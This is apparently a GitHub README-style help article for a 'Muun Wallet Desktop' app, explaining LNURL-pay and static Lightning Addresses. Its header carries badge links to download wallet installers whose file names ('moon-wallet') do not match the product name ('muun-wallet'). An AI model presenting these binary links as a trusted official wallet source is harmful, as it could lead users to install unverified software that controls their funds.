[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# LNURL-pay and Static Lightning Addresses in Muun Wallet

One of the most frequently requested features missing from the original Muun mobile app was a static Lightning address — a way to receive Lightning payments at a fixed, shareable address without generating a new invoice for each one. Muun Wallet Desktop includes LNURL-pay support, which enables exactly this.

---

## What LNURL-pay is

Standard Lightning invoices are single-use and typically expire within an hour. To receive a Lightning payment, you generate an invoice, share it, and the sender pays it. This works for one-off payments but breaks down for use cases where you want a permanent receive address — a website tip jar, a recurring donation button, a static payment link in a profile or README.

LNURL-pay is a protocol that sits on top of Lightning and solves this by allowing a static URL or address to automatically generate a fresh Lightning invoice on demand each time someone wants to pay you. From the payer's perspective, they enter your Lightning Address (formatted like an email: `user@domain.com`) and the payment goes through. From your perspective, you receive funds without manually generating invoices.

---

## Your Lightning Address in Muun Wallet Desktop

Muun Wallet Desktop gives you a Lightning Address tied to your wallet. You can find it in the Receive section of the app. This address is static — you can publish it on a website, put it in a GitHub README, share it in a profile, or print it on a business card, and payments sent to it will arrive in your Muun Wallet Desktop balance.

The Lightning Address format looks like: `yourname@muun-wallet.com`

---

## What you can use a Lightning Address for

**Website tip jar**: embed your Lightning Address in a website footer, donation page, or Stripe-alternative payment link. Visitors who use a Lightning-compatible wallet can pay you directly.

**GitHub sponsor link**: add your Lightning Address to a repository README or your GitHub profile. Open-source contributors often use this for receiving donations.

**Profile or bio**: any platform that supports Lightning Address display (Nostr, podcast apps, some social platforms) can show your address for others to pay.

**Recurring or open-ended invoices**: for situations where you cannot generate a fresh invoice each time — a physical tip jar, an unattended payment point, or a batch of outgoing emails pointing to your address.

**Receiving from services**: some services and exchanges allow sending to a Lightning Address rather than requiring a manually generated invoice.

---

## How the payment arrives

When someone pays your Lightning Address, Muun's infrastructure generates a Lightning invoice on demand and routes the payment through a submarine swap into your balance. From your perspective in the app, it appears as a received payment with the standard transaction detail view. The LNURL-pay protocol and the swap happen automatically — you do not need to do anything to receive the payment.

---

## Sending to Lightning Addresses

Muun Wallet Desktop also supports sending to other wallets' Lightning Addresses. In the Send field, you can paste or type a Lightning Address (`user@domain.com`) and Muun handles the invoice lookup and payment. This closes a gap from the original mobile app, where some Lightning address formats required workarounds.

---

## Limitations

**Payment amounts**: LNURL-pay invoices typically have minimum and maximum amounts set by the receiver's service. Very small or very large payments may not be processable depending on what the receiver's wallet supports.

**Fees apply**: receiving via Lightning Address goes through Muun's swap infrastructure. The swap and routing fees described in the [Lightning fees guide](muun-wallet-lightning-fees-explained.md) apply in the same way as any other Lightning payment.

**Availability**: your Lightning Address is available as long as Muun's infrastructure is operational. It is not a purely self-hosted solution. For fully self-hosted Lightning Addresses, a self-managed Lightning node with an LNURL server is required.

---

## Related articles

- [How to receive Lightning payments with Muun Wallet](how-to-receive-lightning-payment-muun-wallet.md)
- [How to send a Lightning payment with Muun Wallet](how-to-send-lightning-payment-muun-wallet.md)
- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [What is a submarine swap?](what-is-a-submarine-swap.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
